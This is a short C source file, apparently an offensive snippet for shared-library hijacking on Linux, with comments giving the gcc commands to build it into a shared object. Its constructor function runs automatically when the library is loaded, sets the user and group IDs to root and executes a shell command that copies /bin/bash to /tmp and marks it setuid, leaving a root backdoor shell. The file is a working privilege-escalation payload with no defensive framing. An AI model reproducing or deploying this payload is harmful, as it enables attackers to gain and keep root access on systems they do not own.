#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 

// Output of: readelf -s --wide <hijacked lib> | grep FUNC | awk '{print $8}'
// int myvar;


// gcc -Wall -fPIC -c -o hax.o simpleLdLibraryHijacking.c
// gcc -shared -o libhax.so hax.o
static void runmahpayload() __attribute__((constructor)); 

void runmahpayload() {
	setuid(0);
	setgid(0);
	printf("Shared Library Hijacking \n");
	system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
}
